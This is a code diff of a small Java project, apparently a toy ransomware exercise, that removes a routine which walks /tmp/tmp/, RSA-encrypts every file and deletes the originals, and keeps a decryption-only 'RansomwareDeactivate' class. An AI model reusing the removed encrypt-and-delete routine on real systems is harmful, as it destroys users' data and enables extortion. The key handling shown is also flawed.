@@ -1,4 +1,4 @@
-	import java.io.BufferedReader;
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
@@ -39,17 +39,6 @@ class secret {
 		KeyPair kp = kpg.generateKeyPair();
 		return kp;
 	}
-	void encryptFiles(int cipherMode,PublicKey pKey,String inputFile,String outputFile) throws Exception{
-			Cipher cipher = Cipher.getInstance("RSA");
-			cipher.init(Cipher.ENCRYPT_MODE,pKey);
-			String textString = "";
-			textString = new String(Files.readAllBytes(Paths.get(inputFile)));
-			byte[] cipherText = cipher.doFinal(textString.getBytes());
-			BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
-			writer.write(Base64.getEncoder().encodeToString(cipherText));
-			writer.close();
-		}
-
 	void decryptFiles(int cipherMode,PrivateKey pKey,String inputFile,String outputFile) throws Exception{
 		Cipher cipher = Cipher.getInstance("RSA");
 		cipher.init(Cipher.DECRYPT_MODE, pKey);
@@ -64,36 +53,11 @@ class secret {
 	}
 }
 
-class RansomwareActivate{
-	void encryptAllFiles() throws IOException{
-		secret sec = new secret();
-		KeyPair kp = sec.secret();
-		RansomwareActivate ransomware = new RansomwareActivate();
-		List<Path> fileNames = new ArrayList<Path>();
-		try{
-			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
-			paths.filter(Files::isRegularFile).forEach(fileNames::add);
-		}
-		catch (Exception e){
-			System.out.println(e);
-		}
-		for(Path file:fileNames){
-			try{
-				System.out.println("Encrypting file: "+file.toString());
-				sec.encryptFiles(Cipher.ENCRYPT_MODE, kp.getPublic(), file.toString(),file.toString()+".enc");
-				File f = new File(file.toString());
-				f.delete();
-			}
-			catch (Exception e){
-				System.out.println(e);
-			}
-		}
-	}
-
+class RansomwareDeactivate{
 	void decryptAllFiles() throws IOException{
 		secret sec = new secret();
 		KeyPair kp = sec.secret();
-		RansomwareActivate ransomware = new RansomwareActivate();
+		RansomwareDeactivate ransomware = new RansomwareDeactivate();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
 			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
@@ -120,8 +84,7 @@ class RansomwareActivate{
 
 public class project {
 	void activate() throws IOException{
-		RansomwareActivate ransomware  = new RansomwareActivate();
-//		ransomware.encryptAllFiles();
+		RansomwareDeactivate ransomware  = new RansomwareDeactivate();
 		ransomware.decryptAllFiles();
 	}
 }
